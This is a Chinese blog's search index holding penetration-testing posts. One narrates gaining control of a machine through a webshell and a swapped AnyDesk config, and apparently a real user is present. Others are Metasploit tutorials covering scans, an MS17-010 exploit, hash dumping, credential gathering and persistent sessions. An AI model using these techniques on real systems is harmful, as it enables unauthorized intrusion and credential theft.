<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>实战靶场无责渗透内网记录学习（1）</title>
    <link href="/2025/02/27/%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E6%97%A0%E8%B4%A3%E6%B8%97%E9%80%8F%E5%86%85%E7%BD%91%E8%AE%B0%E5%BD%95%E5%AD%A6%E4%B9%A0%EF%BC%881%EF%BC%89/"/>
    <url>/2025/02/27/%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E6%97%A0%E8%B4%A3%E6%B8%97%E9%80%8F%E5%86%85%E7%BD%91%E8%AE%B0%E5%BD%95%E5%AD%A6%E4%B9%A0%EF%BC%881%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<p>开局弱口令加文件上传免杀WEBshell，getshell</p><p><img src="/2025/02/27/%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E6%97%A0%E8%B4%A3%E6%B8%97%E9%80%8F%E5%86%85%E7%BD%91%E8%AE%B0%E5%BD%95%E5%AD%A6%E4%B9%A0%EF%BC%881%EF%BC%89/image-20250227161609049.png" alt="image-20250227161609049"></p><p>直接是system权限</p><p><img src="/2025/02/27/%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E6%97%A0%E8%B4%A3%E6%B8%97%E9%80%8F%E5%86%85%E7%BD%91%E8%AE%B0%E5%BD%95%E5%AD%A6%E4%B9%A0%EF%BC%881%EF%BC%89/image-20250304132503684.png" alt="image-20250304132503684"></p><p>查看一下发现并没有杀软</p><p><img src="/2025/02/27/%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E6%97%A0%E8%B4%A3%E6%B8%97%E9%80%8F%E5%86%85%E7%BD%91%E8%AE%B0%E5%BD%95%E5%AD%A6%E4%B9%A0%EF%BC%881%EF%BC%89/image-20250304132639950.png" alt="image-20250304132639950"></p><p>由于是windows32位系统和一些其他问题，一直上线不了CS</p><p>再次审查一遍进程，发现存在anydesk，直接替换文件拿到权限</p><p><img src="/2025/02/27/%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E6%97%A0%E8%B4%A3%E6%B8%97%E9%80%8F%E5%86%85%E7%BD%91%E8%AE%B0%E5%BD%95%E5%AD%A6%E4%B9%A0%EF%BC%881%EF%BC%89/image-20250304160225847.png" alt="image-20250304160225847"></p><p>先本地测试</p><p>这里攻击机下载打开anydesk然后获取文件，然后设置密码，并且记住ID</p><p>靶机也下载打开anydesk文件，将攻击机的文件替换到靶机的配置文件中，然后攻击机关闭软件以及删除配置文件，重新打开，连接成功</p><p><img src="/2025/02/27/%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E6%97%A0%E8%B4%A3%E6%B8%97%E9%80%8F%E5%86%85%E7%BD%91%E8%AE%B0%E5%BD%95%E5%AD%A6%E4%B9%A0%EF%BC%881%EF%BC%89/image-20250304161948561.png" alt="image-20250304161948561"></p><p>将靶机的替换过来，连接，我靠，貌似有人在电脑面前，希望不会被发现😱，等到晚点再说。。。</p><p><img src="/2025/02/27/%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E6%97%A0%E8%B4%A3%E6%B8%97%E9%80%8F%E5%86%85%E7%BD%91%E8%AE%B0%E5%BD%95%E5%AD%A6%E4%B9%A0%EF%BC%881%EF%BC%89/image-20250304161908093.png" alt="image-20250304161908093"></p><p>查看用户登录的时间，发现确实HD-USER正在登录</p><p><img src="/2025/02/27/%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E6%97%A0%E8%B4%A3%E6%B8%97%E9%80%8F%E5%86%85%E7%BD%91%E8%AE%B0%E5%BD%95%E5%AD%A6%E4%B9%A0%EF%BC%881%EF%BC%89/image-20250304162350428.png" alt="image-20250304162350428"></p><p>牛逼了，下班时间到，电脑直接关机，马都连不上了</p><p><img src="/2025/02/27/%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E6%97%A0%E8%B4%A3%E6%B8%97%E9%80%8F%E5%86%85%E7%BD%91%E8%AE%B0%E5%BD%95%E5%AD%A6%E4%B9%A0%EF%BC%881%EF%BC%89/image-20250304171236762.png" alt="image-20250304171236762"></p><p>未完待续……</p>]]></content>
    
    
    
    <tags>
      
      <tag>渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>powershell设置代理</title>
    <link href="/2025/02/18/powershell%E8%AE%BE%E7%BD%AE%E4%BB%A3%E7%90%86/"/>
    <url>/2025/02/18/powershell%E8%AE%BE%E7%BD%AE%E4%BB%A3%E7%90%86/</url>
    
    <content type="html"><![CDATA[<h2 id="如何设置代理？"><a href="#如何设置代理？" class="headerlink" title="如何设置代理？"></a><strong>如何设置代理？</strong></h2><p>我们将通过创建 PowerShell 函数来实现快速开启和关闭代理的功能。</p><h3 id="步骤-1：找到并编辑-PowerShell-配置文件"><a href="#步骤-1：找到并编辑-PowerShell-配置文件" class="headerlink" title="步骤 1：找到并编辑 PowerShell 配置文件"></a><strong>步骤 1：找到并编辑 PowerShell <a href="https://zhida.zhihu.com/search?content_id=252477125&content_type=Article&match_order=1&q=%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6&zhida_source=entity">配置文件</a></strong></h3><p>首先，我们需要找到 PowerShell 的配置文件。如果你还没有创建过，可以用以下命令创建：</p><figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell"><span class="hljs-keyword">if</span> (!(<span class="hljs-built_in">Test-Path</span> <span class="hljs-literal">-Path</span> <span class="hljs-variable">$PROFILE</span>)) &#123;<br>    <span class="hljs-built_in">New-Item</span> <span class="hljs-literal">-ItemType</span> File <span class="hljs-literal">-Path</span> <span class="hljs-variable">$PROFILE</span> <span class="hljs-literal">-Force</span><br>&#125;<br>notepad <span class="hljs-variable">$PROFILE</span><br></code></pre></div></td></tr></table></figure><p>这会打开你的 PowerShell 配置文件。配置文件的默认路径通常是： <code>C:\Users\你的用户名\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1</code></p><h3 id="步骤-2：添加代理函数"><a href="#步骤-2：添加代理函数" class="headerlink" title="步骤 2：添加代理函数"></a><strong>步骤 2：添加代理函数</strong></h3><p>在打开的配置文件中，添加以下函数：</p><figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">proxy</span></span> &#123;<br>    <span class="hljs-variable">$env:http_proxy</span> = <span class="hljs-string">&quot;http://127.0.0.1:10809&quot;</span><br>    <span class="hljs-variable">$env:https_proxy</span> = <span class="hljs-string">&quot;http://127.0.0.1:10809&quot;</span><br>    [<span class="hljs-type">System.Net.WebRequest</span>]::DefaultWebProxy = <span class="hljs-built_in">New-Object</span> System.Net.WebProxy(<span class="hljs-string">&quot;http://127.0.0.1:10809&quot;</span>)<br>    <span class="hljs-built_in">Write-Host</span> <span class="hljs-string">&quot;Proxy enabled: http://127.0.0.1:10809&quot;</span> <span class="hljs-literal">-ForegroundColor</span> Green<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">unproxy</span></span> &#123;<br>    <span class="hljs-variable">$env:http_proxy</span> = <span class="hljs-variable">$null</span><br>    <span class="hljs-variable">$env:https_proxy</span> = <span class="hljs-variable">$null</span><br>    [<span class="hljs-type">System.Net.WebRequest</span>]::DefaultWebProxy = <span class="hljs-variable">$null</span><br>    <span class="hljs-built_in">Write-Host</span> <span class="hljs-string">&quot;Proxy disabled&quot;</span> <span class="hljs-literal">-ForegroundColor</span> Yellow<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check-proxy</span></span> &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$env:http_proxy</span> <span class="hljs-operator">-or</span> <span class="hljs-variable">$env:https_proxy</span>) &#123;<br>        <span class="hljs-built_in">Write-Host</span> <span class="hljs-string">&quot;Current proxy settings:&quot;</span> <span class="hljs-literal">-ForegroundColor</span> Cyan<br>        <span class="hljs-built_in">Write-Host</span> <span class="hljs-string">&quot;HTTP Proxy: <span class="hljs-variable">$env:http_proxy</span>&quot;</span><br>        <span class="hljs-built_in">Write-Host</span> <span class="hljs-string">&quot;HTTPS Proxy: <span class="hljs-variable">$env:https_proxy</span>&quot;</span><br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">Write-Host</span> <span class="hljs-string">&quot;No proxy is currently set.&quot;</span> <span class="hljs-literal">-ForegroundColor</span> Cyan<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="步骤-3：保存并重新加载配置"><a href="#步骤-3：保存并重新加载配置" class="headerlink" title="步骤 3：保存并重新加载配置"></a><strong>步骤 3：保存并重新加载配置</strong></h3><p>保存文件，然后重新启动 PowerShell 或运行 <code>. $PROFILE</code> 来重新加载配置文件。</p><h2 id="如何使用"><a href="#如何使用" class="headerlink" title="如何使用"></a><strong>如何使用</strong></h2><p>现在，你可以在 PowerShell 中使用以下命令：</p><ul><li>输入 <code>proxy</code> 来启用代理</li><li>输入 <code>unproxy</code> 来禁用代理</li><li>输入 <code>check-proxy</code> 来查看当前的<a href="https://zhida.zhihu.com/search?content_id=252477125&content_type=Article&match_order=1&q=%E4%BB%A3%E7%90%86%E8%AE%BE%E7%BD%AE&zhida_source=entity">代理设置</a></li></ul><h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a><strong>注意事项</strong></h2><ol><li>这个设置只影响当前的 PowerShell 会话，不会影响其他应用程序或系统级的代理设置。</li><li>如果你的代理地址和端口不是 <code>127.0.0.1:10809</code>，请相应地修改函数中的 URL。</li><li>如果你的代理需要认证，你需要修改函数来包含用户名和密码。</li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>小技巧</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>msf介绍以及技巧-2</title>
    <link href="/2025/01/27/msf%E4%BB%8B%E7%BB%8D%E4%BB%A5%E5%8F%8A%E6%8A%80%E5%B7%A7-2/"/>
    <url>/2025/01/27/msf%E4%BB%8B%E7%BB%8D%E4%BB%A5%E5%8F%8A%E6%8A%80%E5%B7%A7-2/</url>
    
    <content type="html"><![CDATA[<h1 id="auxiliary-模块："><a href="#auxiliary-模块：" class="headerlink" title="_auxiliary_模块："></a>_auxiliary_模块：</h1><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">ACK 通过ACK扫描的方式对防火墙上未屏蔽的端口进行探测<br>ftpbounce 通过FTPbounce攻击的原理对TCP服务进行枚举，一些新的FTP服务器软件能够很好的防范FTPbounce攻击，但在一些旧的Solaris及FreeBSD 系统的FTP服务中此类工具方法仍能够被利用<br>syn 使用发送TCP SYN标志的方式探测开放的端口<br>tcp 通过一次完整的TCP连接来判断端口是否开放，这种扫描方式最准确，但扫描速度较慢<br>xmas 一种更为隐秘的扫描方式，通过发送FIN,PSH,和URG标志，能够躲避一些高级的TCP标记检测器的过滤<br><br>1 TCP端⼝扫描 auxiliary/scanner/portscan/tcp<br>2 ACK防⽕墙扫描 auxiliary/scanner/portscan/ack<br>3 FTP跳端⼝扫描 auxiliary/scanner/portscan/ftpbounce<br>4 SYN端⼝扫描 auxiliary/scanner/portscan/syn<br>5 TCP-XMas端⼝扫描 auxiliary/scanner/portscan/xmas<br><br><br></code></pre></div></td></tr></table></figure><h2 id="TCP端⼝扫描：auxiliary-scanner-portscan-tc"><a href="#TCP端⼝扫描：auxiliary-scanner-portscan-tc" class="headerlink" title="TCP端⼝扫描：auxiliary&#x2F;scanner&#x2F;portscan&#x2F;tc"></a><strong>TCP<strong><strong>端⼝扫描：</strong></strong>auxiliary&#x2F;scanner&#x2F;portscan&#x2F;tc</strong></h2><p><img src="/2025/01/27/msf%E4%BB%8B%E7%BB%8D%E4%BB%A5%E5%8F%8A%E6%8A%80%E5%B7%A7-2/image-20250127112820763.png" alt="image-20250127112820763"></p><p>扫描结束！192.168.119.139开放了以下端⼝：</p><p><img src="/2025/01/27/msf%E4%BB%8B%E7%BB%8D%E4%BB%A5%E5%8F%8A%E6%8A%80%E5%B7%A7-2/image-20250127112841438.png" alt="image-20250127112841438"></p><h2 id="ACK防⽕墙扫描：auxiliary-scanner-portscan-ack"><a href="#ACK防⽕墙扫描：auxiliary-scanner-portscan-ack" class="headerlink" title="ACK防⽕墙扫描：auxiliary&#x2F;scanner&#x2F;portscan&#x2F;ack"></a><strong>ACK<strong><strong>防⽕墙扫描：</strong></strong>auxiliary&#x2F;scanner&#x2F;portscan&#x2F;ack</strong></h2><p><img src="/2025/01/27/msf%E4%BB%8B%E7%BB%8D%E4%BB%A5%E5%8F%8A%E6%8A%80%E5%B7%A7-2/image-20250127112906066.png" alt="image-20250127112906066"></p><figure class="highlight erlang-repl"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs erlang-repl">⽤ACK扫描会分段去发送数据包扫描，才能够绕过⼀些防火墙设备，⽽不是Windows防火墙！Windows⾃带的防火墙是阻断⼀切进入的连接!<br>因为虚拟机Windwos <span class="hljs-number">7</span>是吧防火墙关闭了的，如果打开那么防火墙是会阻断连接的！<br>经过测试，Windows防火墙开启，使⽤ACK是扫描不出来的！<br></code></pre></div></td></tr></table></figure><p><img src="/2025/01/27/msf%E4%BB%8B%E7%BB%8D%E4%BB%A5%E5%8F%8A%E6%8A%80%E5%B7%A7-2/image-20250127112917972.png" alt="image-20250127112917972"></p><figure class="highlight"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs">剩余⼏个端⼝扫描，和上⾯的例⼦是⼀样的⽤法，只是模式不同！<br></code></pre></div></td></tr></table></figure><p>**版本扫描 ** </p><p><strong>探测对方操作系统信息：****use auxiliary&#x2F;scanner&#x2F;smb&#x2F;smb_version</strong></p><p><img src="/2025/01/27/msf%E4%BB%8B%E7%BB%8D%E4%BB%A5%E5%8F%8A%E6%8A%80%E5%B7%A7-2/image-20250127112946152.png" alt="image-20250127112946152"></p><p><img src="/2025/01/27/msf%E4%BB%8B%E7%BB%8D%E4%BB%A5%E5%8F%8A%E6%8A%80%E5%B7%A7-2/image-20250127112952424.png" alt="image-20250127112952424"></p><figure class="highlight elixir"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs elixir">可以看到，操作系统是<span class="hljs-title class_">Windows</span> <span class="hljs-number">7</span>,主机名是<span class="hljs-symbol">:LIUWX-PC</span>,不在域内<br></code></pre></div></td></tr></table></figure><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a><strong>其他</strong></h2><h3 id="永恒之蓝：-MS-17-010"><a href="#永恒之蓝：-MS-17-010" class="headerlink" title="永恒之蓝：****MS-17-010"></a><strong>永恒之蓝：****MS-17-010</strong></h3><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">msf5 auxiliary(scanner/smb/smb_version) &gt; use auxiliary/scanner/smb/smb_ms17_010<br>msf5 auxiliary(scanner/smb/smb_ms17_010) &gt; set rhosts 192.168.119.139<br>rhosts =&gt; 192.168.119.139<br>msf5 auxiliary(scanner/smb/smb_ms17_010) &gt; show options<br></code></pre></div></td></tr></table></figure><p><img src="/2025/01/27/msf%E4%BB%8B%E7%BB%8D%E4%BB%A5%E5%8F%8A%E6%8A%80%E5%B7%A7-2/image-20250127113100783.png" alt="image-20250127113100783"></p><figure class="highlight applescript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs applescript">Host <span class="hljs-keyword">is</span> likely VULNERABLE <span class="hljs-keyword">to</span> MS17<span class="hljs-number">-010</span>!<br>说明是存在永恒之蓝这个漏洞的！<br>存在的话，就可以利⽤：<br></code></pre></div></td></tr></table></figure><p><img src="/2025/01/27/msf%E4%BB%8B%E7%BB%8D%E4%BB%A5%E5%8F%8A%E6%8A%80%E5%B7%A7-2/image-20250127113114802.png" alt="image-20250127113114802"></p><p>可以看到，虚拟机Win7已经蓝屏！</p><p><img src="/2025/01/27/msf%E4%BB%8B%E7%BB%8D%E4%BB%A5%E5%8F%8A%E6%8A%80%E5%B7%A7-2/image-20250127113129493.png" alt="image-20250127113129493"></p><p><strong>⼩技巧</strong></p><p>我⾸先是在&#x2F;root⽬录下建立了⼀个ips.txt文本，⾥⾯是我要扫描的IP:</p><p>set rhosts file:&#x2F;root&#x2F;ips.txt</p><h1 id="post模块"><a href="#post模块" class="headerlink" title="post模块"></a>post模块</h1><p><strong>后渗透操作</strong></p><figure class="highlight livecodeserver"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs livecodeserver">在获取到一枚Meterpreter的<span class="hljs-built_in">shell</span>之后，就可以进行下一步的渗透，这就是传说中的后<br>渗透了<br><br>那msf中的<span class="hljs-built_in">post</span>模块就是⼀个后渗透模块，⾥⾯包含各种后渗透中有可能⽤到的功能，最多的就<br>是信息收集。<br></code></pre></div></td></tr></table></figure><p><img src="/2025/01/27/msf%E4%BB%8B%E7%BB%8D%E4%BB%A5%E5%8F%8A%E6%8A%80%E5%B7%A7-2/image-20250128194715773.png" alt="image-20250128194715773"></p><figure class="highlight"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs">那么我这边就模拟⼀下拿到cmdshell后的操作：<br></code></pre></div></td></tr></table></figure><p><img src="/2025/01/27/msf%E4%BB%8B%E7%BB%8D%E4%BB%A5%E5%8F%8A%E6%8A%80%E5%B7%A7-2/image-20250128194746463.png" alt="image-20250128194746463"></p><figure class="highlight pgsql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs pgsql">可以看到，我这边sessions是有⼀个meterpreter会话：<br><span class="hljs-keyword">session</span><br></code></pre></div></td></tr></table></figure><p><strong>在后渗透的时候，我们可以使⽤post模块辅助我们</strong></p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">post<span class="hljs-regexp">/multi/</span>recon/local_exploit_suggester<br>post<span class="hljs-regexp">/windows/g</span>ather/hashdump<br>post<span class="hljs-regexp">/windows/g</span>ather/smart_hashdump<br>post<span class="hljs-regexp">/multi/g</span>ather/firefox_creds<br>post<span class="hljs-regexp">/multi/g</span>ather<span class="hljs-regexp">/ssh_credspost/</span>windows<span class="hljs-regexp">/gather/</span>enumapplicatio<br>...等等<br></code></pre></div></td></tr></table></figure><figure class="highlight mercury"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mercury">post/<span class="hljs-keyword">multi</span>/recon/local_exploit_suggester<br>假设我们拿到⼀个cmdshell，但是权限很⼩，那我们可以使⽤这个模块来建议我们提权：<br>post/<span class="hljs-keyword">multi</span>/recon/local_exploit_suggester<br>下⾯是它的⼀个介绍:<br>msf5 &gt; info post/<span class="hljs-keyword">multi</span>/recon/local_exploit_suggester<br>......<br>从上⾯的banner可以看到，它⽀持的平台挺多的，比如windows、Android…等等<br><br>run运⾏后它会比较慢，因为它会查询systeminfo来看看那些补丁没打，从⽽探测可以使⽤那些<br>exploit来进⾏提权：<br></code></pre></div></td></tr></table></figure><p><img src="/2025/01/27/msf%E4%BB%8B%E7%BB%8D%E4%BB%A5%E5%8F%8A%E6%8A%80%E5%B7%A7-2/image-20250128195006333.png" alt="image-20250128195006333"></p><p>run执⾏完毕后，msf给出了我们两个exploit：</p><figure class="highlight applescript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs applescript">exploit/windows/<span class="hljs-keyword">local</span>/ms10_092_schelevator: The target appears <span class="hljs-keyword">to</span> be vulnerable.<br>exploit/windows/<span class="hljs-keyword">local</span>/ms16_014_wmi_recv_notif: The target appears <span class="hljs-keyword">to</span> be vulnerable.<br></code></pre></div></td></tr></table></figure><p><img src="/2025/01/27/msf%E4%BB%8B%E7%BB%8D%E4%BB%A5%E5%8F%8A%E6%8A%80%E5%B7%A7-2/image-20250128195148389.png" alt="image-20250128195148389"></p><h2 id="hashdump"><a href="#hashdump" class="headerlink" title="hashdump"></a><strong>hashdump</strong></h2><p><strong>hashdump****是查询密码hash：</strong></p><p><strong>因为有时候你得搜集密码来进⾏爆破别的⽤户</strong></p><p><img src="/2025/01/27/msf%E4%BB%8B%E7%BB%8D%E4%BB%A5%E5%8F%8A%E6%8A%80%E5%B7%A7-2/image-20250128195207654.png" alt="image-20250128195207654"></p><figure class="highlight dts"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dts">meterpreter &gt; hashdump<br><span class="hljs-symbol">Administrator:</span><span class="hljs-number">500</span>:aad3b435b51404eeaad3b435b51404ee:<span class="hljs-number">31</span>d6cfe0d16ae931b73c <span class="hljs-number">59</span>d7e0c089c0:::<br><span class="hljs-symbol">Guest:</span><span class="hljs-number">501</span>:aad3b435b51404eeaad3b435b51404ee:<span class="hljs-number">31</span>d6cfe0d16ae931b73c59d7e0c0 <span class="hljs-number">89</span>c0:::<br><span class="hljs-symbol">hack:</span><span class="hljs-number">1001</span>:aad3b435b51404eeaad3b435b51404ee:f39934a2710a469b3c63ce148779 <span class="hljs-number">4514</span>:::<br><span class="hljs-symbol">liuwx:</span><span class="hljs-number">1000</span>:aad3b435b51404eeaad3b435b51404ee:<span class="hljs-number">31</span>d6cfe0d16ae931b73c59d7e0c <span class="hljs-number">089</span>c0:::<br><br>信息收集：<br>run post<span class="hljs-keyword">/windows/</span>gather/checkvm <span class="hljs-meta">#是否虚拟机</span><br>run post<span class="hljs-keyword">/linux/</span>gather/checkvm <span class="hljs-meta">#是否虚拟机</span><br>run post<span class="hljs-keyword">/windows/</span>gather<span class="hljs-keyword">/forensics/</span>enum_drives <span class="hljs-meta">#查看分区</span><br>run post<span class="hljs-keyword">/windows/</span>gather/enum_applications <span class="hljs-meta">#获取安装软件信息</span><br>run post<span class="hljs-keyword">/windows/</span>gather/dumplinks <span class="hljs-meta">#获取最近的文件操作</span><br>run post<span class="hljs-keyword">/windows/</span>gather/enum_ie <span class="hljs-meta">#获取IE缓存</span><br>run post<span class="hljs-keyword">/windows/</span>gather/enum_chrome <span class="hljs-meta">#获取Chrome缓存</span><br>run post<span class="hljs-keyword">/windows/</span>gather/enum_patches <span class="hljs-meta">#补丁信息</span><br>run post<span class="hljs-keyword">/windows/</span>gather/enum_domain <span class="hljs-meta">#查找域控</span><br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>msf介绍以及技巧（简单介绍）</title>
    <link href="/2025/01/25/msf%E4%BB%8B%E7%BB%8D%E4%BB%A5%E5%8F%8A%E6%8A%80%E5%B7%A7-1/"/>
    <url>/2025/01/25/msf%E4%BB%8B%E7%BB%8D%E4%BB%A5%E5%8F%8A%E6%8A%80%E5%B7%A7-1/</url>
    
    <content type="html"><![CDATA[<h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p><img src="/2025/01/25/msf%E4%BB%8B%E7%BB%8D%E4%BB%A5%E5%8F%8A%E6%8A%80%E5%B7%A7-1/image-20250125221747904.png" alt="image-20250125221747904"></p><p>meatasploit有很多模块，一共分为七类。</p><p><img src="/2025/01/25/msf%E4%BB%8B%E7%BB%8D%E4%BB%A5%E5%8F%8A%E6%8A%80%E5%B7%A7-1/image-20250125221633705.png" alt="image-20250125221633705"></p><figure class="highlight basic"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs basic"><span class="hljs-symbol">1 </span>exploits 漏洞利用模块，这个模块通常是用于对某些有可能存在漏洞的目标进行漏洞利用。<br><span class="hljs-symbol">2 </span>payloads 攻击载荷，exploit成功之后就会执行payload，这段payload可以是反弹代码，可以是添加用户的代码。<br><span class="hljs-symbol">3 </span>auxiliary 辅助模块，该模块是用于辅助渗透的，比如端口扫描、存活探测、暴力破解。<br><span class="hljs-symbol">4 </span>post 后渗透模块，该模块一般用于内网渗透。<br><span class="hljs-symbol">5 </span>encoders 编码器模块，对payload进行编码加密，可绕过部分杀软软件。<br><span class="hljs-symbol">6 </span>evasion 躲避模块，该模块分类下只有<span class="hljs-number">4</span>个，都是为了躲避微软的限制或者是杀软的，免杀效果很一般。<br><span class="hljs-symbol">7 </span>nops 空指令模块，不知道<br></code></pre></div></td></tr></table></figure><h1 id="技巧"><a href="#技巧" class="headerlink" title="技巧"></a>技巧</h1><figure class="highlight scss"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs scss">&gt;&gt; msf5 <span class="hljs-built_in">exploit</span>(multi/handler) &gt; set SessionCommunicationTimeout <span class="hljs-number">0</span>  <span class="hljs-comment">//默认情况下，如果一个会话将在5分钟（300秒）没有任何活动，那么它会被杀死,为防止此情况可将此项修改为0</span><br><br>&gt;&gt; msf5 <span class="hljs-built_in">exploit</span>(multi/handler) &gt; set SessionExpirationTimeout <span class="hljs-number">0</span> <span class="hljs-comment">//默认情况下，一个星期（604800秒）后，会话将被强制关闭,修改为0可永久不会被关闭</span><br><br><br></code></pre></div></td></tr></table></figure><p><img src="/2025/01/25/msf%E4%BB%8B%E7%BB%8D%E4%BB%A5%E5%8F%8A%E6%8A%80%E5%B7%A7-1/image-20250125221940615.png" alt="image-20250125221940615"></p><figure class="highlight mipsasm"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mipsasm">加载模块<br>use name<br>查看网络配置<br>ifconfig<br>获取进程列表<br>ps<br>查看所有exploit<br><span class="hljs-keyword">show </span>exploits<br>查看所有payload<br><span 